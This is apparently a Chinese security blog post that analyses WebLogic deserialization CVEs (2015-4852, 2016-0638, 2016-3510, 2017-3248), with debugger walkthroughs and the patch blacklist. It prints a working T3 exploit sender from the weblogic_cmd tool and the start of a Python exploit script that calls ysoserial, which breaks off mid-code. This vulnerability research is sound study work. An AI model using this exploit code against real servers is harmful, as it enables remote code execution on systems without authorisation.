+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readClassDescriptor()从流量中获取序列化类的ObjectStreamClass并赋值给readDesc变量  </span><br><span class="line">把readDesc变量当参数传入resolveClass函数，结果赋值cl变量(获取反序列化数据类名)  </span><br><span class="line">把ObjectStreamClass流(readDesc)和Class类对象传入initNonProxy方法，初始化并赋给desc. </span><br><span class="line">将ObjectStreamClass类型的desc变量返回给readNonProxyDesc函数</span><br></pre></td></tr></table></figure>
+<p>然后我们在回头看看<code>readOrdinaryObject</code>方法</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612223130271.png" class="">
+
+<p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>我这里直接使用工具进行漏洞利用，然后抓包分析</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612174402108.png" class="">
+
+<p>可以看到数据包中后面的部分已经被替换为恶意的序列化数据了。</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612175912065.png" class="">
+
+<p>可以看到调用了内部类<code>ServerChannelInputStream</code>的readObject方法，该类继承ObjectInputstream</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612180620926.png" class="">
+
+<p>在这里其实就可以看到<code>ServerChannelInputStream</code>是一个内部类，该类继承<code>ObjectInputStream</code>类，而在这里对<code>resolveClass</code>进行了重写，不过这里还是调用的父类的resolveClass并且没有任何验证，所以造成了漏洞。跟过java原生readobject流程的师傅都明白最终会走到<code>resolveClass</code> 来加载类。</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612181748512.png" class="">
+
+<p>首先会调用父类的readObject0</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182104387.png" class="">
+
+<p>然后会进入readOrdinaryObject方法中</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182554838.png" class="">
+
+<p>继续走走到readClassDesc方法中</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182645330.png" class="">
+
+<p>继续走到 readNonProxyDesc方法中</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612182744934.png" class="">
+
+<p>最终调用resolveClass 方法完成加载，因为没有给重写的resolveclass方法加上黑名单，所以我们可以使用恶意payload进行攻击，并且webloigc是自带低版本的CC依赖包的：<br>官方修复就是在resolveclass加入了黑名单检查</p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>分析补丁</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName();</span><br><span class="line">    <span class="comment">// 该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常，表示反序列化未被授权</span></span><br><span class="line">    <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, descriptor.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果className不在黑名单中，则调用父类的resolveClass方法来解析该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">localDesc</span> <span class="operator">=</span> ObjectStreamClass.lookup(c);</span><br><span class="line">            <span class="keyword">if</span> (localDesc != <span class="literal">null</span> &amp;&amp; localDesc.getSerialVersionUID() != descriptor.getSerialVersionUID()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;different serialVersionUID. local: &quot;</span> + localDesc.getSerialVersionUID() + <span class="string">&quot; remote: &quot;</span> + descriptor.getSerialVersionUID());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>isBlackListed</code>这个方法主要是用来检查加载的类是否在黑名单中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBlackListed</span><span class="params">(String className)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查className的长度是否大于0，并且是否在BLACK_LIST（一个常量Set集合）中</span></span><br><span class="line">    <span class="keyword">if</span> (className.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(className)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String pkgName;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 找到最后一个“.”（点号）的位置，获取类名的包名部分</span></span><br><span class="line">            pkgName = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="number">46</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果获取包名成功，并且包名的长度大于0，那么再次检查pkgName是否在BLACK_LIST中</span></span><br><span class="line">        <span class="keyword">return</span> pkgName.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(pkgName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231146585.png" class="">
+
+<p>偷师哥的一张图，自己懒没有去配补丁环境，现在我们需要做的事情就是找到别的类中是否有可以利用的readObject进行二次反序列化，这样就可以绕过了，并且注意我 们前提知识里的话，会依次调用readObject、readResolve、readExternal。</p>
+<p>这个漏洞大佬们发掘的是<code>weblogic.jms.common.StreamMessageImpl</code>,这个类不再黑名单中并且实现了Externalizable接口</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231514572.png" class="">
+
+<p>所以显然后面利用的就是<code>readExternal</code>方法</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612231609745.png" class="">
+
+<p>这个里面调用了readobject方法，因此最终造成了二次反序列化。这里需要看一下这个va4是哪里来的</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233027545.png" class="">
+
+<p>createPayload函数中首先从InputStream流中获取一个int类型的数据，之后将输入流和int类型数据传递给copyPayloadFromStream函数。该部分代码如下</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233039309.png" class="">
+
+<p>copyPayloadFromStream从反序列化获取的长度和ChunkSize的2倍进行比较选出最小的那个，并和输入流一起传入到Chunk.createOneSharedChunk函数中进行如下操作，最后返回了一个包含指定长度输入流的chunk块</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612233342687.png" class="">
+
+<p>所以只需在序列化的时候填充相应的数据就可以实现指定数据的二次反序列化。</p>
+<p>网上用的都是 <a target="_blank" rel="noopener" href="https://github.cm/5up3rc/weblogic_cmd">https://github.cm/5up3rc/weblogic_cmd</a> 这个工具进行利用的，同样我们也试试，分析下payload的生成过程。</p>
+<p>先下一个断点</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235455088.png" class="">
+
+<p>跟一下</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235645502.png" class="">
+
+<p>继续跟踪<code>WebLogicOperation.blindExecute</code>方法</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235728160.png" class="">
+
+<p>这里生成命令之后，<code>serialBlindDatas</code>方法应该就是生成序列化数据的了</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235829729.png" class="">
+
+<p>继续走<code>blindExecutePayloadTransformerChain</code></p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250612235856790.png" class="">
+
+<p>很明显的cc链，继续跟</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000031882.png" class="">
+
+<p>后面调用了<code>BypassPayloadSelector.selectBypass</code>方法来处理在原生的利用链中本该直接进行序列化的对象。</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000117671.png" class="">
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000310454.png" class="">
+
+<p>这里就是最后生成的payload使用的是<code>streamMessageImpl</code>进行包裹</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613000346065.png" class="">
+
+<p>然后就可以发送了，贴一下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String host, String port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> SocketFactory.newSocket(host, Integer.parseInt(port));  </span><br><span class="line">        <span class="comment">//AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;t3 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;https&quot;</span>)) &#123;  </span><br><span class="line">            header = <span class="string">&quot;t3s 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        s.getOutputStream().write(header.getBytes());  </span><br><span class="line">        s.getOutputStream().flush();  </span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(s.getInputStream()));  </span><br><span class="line">        <span class="type">String</span> <span class="variable">versionInfo</span> <span class="operator">=</span> br.readLine();  </span><br><span class="line">        <span class="keyword">if</span> (Main.version == <span class="literal">null</span>) &#123;  </span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;HELO:&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;.false&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;weblogic version:&quot;</span> + versionInfo);  </span><br><span class="line">            Main.version = versionInfo;  </span><br><span class="line">        &#125;  </span><br><span class="line"><span class="comment">//        String asInfo = br.readLine();  </span></span><br><span class="line"><span class="comment">//        String hlInfo = br.readLine();  </span></span><br><span class="line"><span class="comment">//        System.out.println(versionInfo+&quot;\n&quot;+asInfo+&quot;\n&quot;+hlInfo);  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1  </span></span><br><span class="line">        <span class="comment">//t3 protocol        String cmd = &quot;08&quot;;  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">qos</span> <span class="operator">=</span> <span class="string">&quot;65&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">responseId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">invokableId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">abbrevOffset</span> <span class="operator">=</span> <span class="string">&quot;00000000&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">countLength</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">capacityLength</span> <span class="operator">=</span> <span class="string">&quot;10&quot;</span>;<span class="comment">//必须大于上面设置的AS值  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">readObjectType</span> <span class="operator">=</span> <span class="string">&quot;00&quot;</span>;<span class="comment">//00 object deserial 01 ascii  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">datas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        datas.append(cmd);  </span><br><span class="line">        datas.append(qos);  </span><br><span class="line">        datas.append(flags);  </span><br><span class="line">        datas.append(responseId);  </span><br><span class="line">        datas.append(invokableId);  </span><br><span class="line">        datas.append(abbrevOffset);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//because of 2 times deserial  </span></span><br><span class="line">        countLength = <span class="string">&quot;04&quot;</span>;  </span><br><span class="line">        datas.append(countLength);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//define execute operation  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">pahse1Str</span> <span class="operator">=</span> BytesOperation.bytesToHexString(payload);  </span><br><span class="line">        datas.append(capacityLength);  </span><br><span class="line">        datas.append(readObjectType);  </span><br><span class="line">        datas.append(pahse1Str);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//for compatiable fo hide  </span></span><br><span class="line">        <span class="comment">//for compatiable fo hide        AuthenticatedUser authenticatedUser = new AuthenticatedUser(&quot;weblogic&quot;, &quot;admin123&quot;);  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">phase4</span> <span class="operator">=</span> BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));  </span><br><span class="line">        datas.append(capacityLength);  </span><br><span class="line">        datas.append(readObjectType);  </span><br><span class="line">        datas.append(phase4);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">serverName</span> <span class="operator">=</span> src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);  </span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        serverName.set(src,<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        datas.append(capacityLength);  </span><br><span class="line">        datas.append(readObjectType);  </span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">dst</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();  </span><br><span class="line">  </span><br><span class="line">        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);  </span><br><span class="line">        serverName = src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);  </span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        serverName.set(dst,<span class="number">1</span>);  </span><br><span class="line">        datas.append(capacityLength);  </span><br><span class="line">        datas.append(readObjectType);  </span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] headers = BytesOperation.hexStringToBytes(datas.toString());  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> headers.length + <span class="number">4</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hexLen</span> <span class="operator">=</span> Integer.toHexString(len);  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">dataLen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (hexLen.length() &lt; <span class="number">8</span>) &#123;  </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; (<span class="number">8</span> - hexLen.length()); i++) &#123;  </span><br><span class="line">                dataLen.append(<span class="string">&quot;0&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        dataLen.append(hexLen);  </span><br><span class="line">        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));  </span><br><span class="line">        s.getOutputStream().flush();  </span><br><span class="line">        s.close();  </span><br><span class="line">  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>此漏洞的利用方式和0638一样，不过用的<code>StreamMessageImpl</code>类，而是借助<code>MarshalledObject</code>类。继续使用weblogic_cmd工具进行测试，不过这里要改下参数，前面的TYPE需要修改为<code>marshall</code>,因为这次是需要使用到<code>MarshalledObject</code>来进行封装对象。</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613123924444.png" class="">
+
+<p>然后打断点调试一下，这里在之前也介绍过Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224117201.png" class="">
+
+<p>而这里就是入口</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224231012.png" class="">
+
+<p>然后依次调用到readResolve方法</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224251628.png" class="">
+
+<p>可以看到这里存在二次反序列化。那在看看这个var2是咋来的其实在返回去看工具生成payload的流程就知道了</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224825538.png" class="">
+
+<p>跟进去</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224847241.png" class="">
+
+<p>继续跟进去</p>
+<img src="/2025/06/11/Java%E5%AE%89%E5%85%A8/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20250613224901040.png" class="">
+
+<p>结果显而易见和<code>streamMessageImpl</code>一样就是直接把payload塞进去了。</p>
+<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>先来把exp贴一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    <span class="comment">#generates ysoserial payload</span></span><br><span class="line">    command = <span class="string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;command: &quot;</span> + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(<span class="string">&#x27;payload.out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = <span 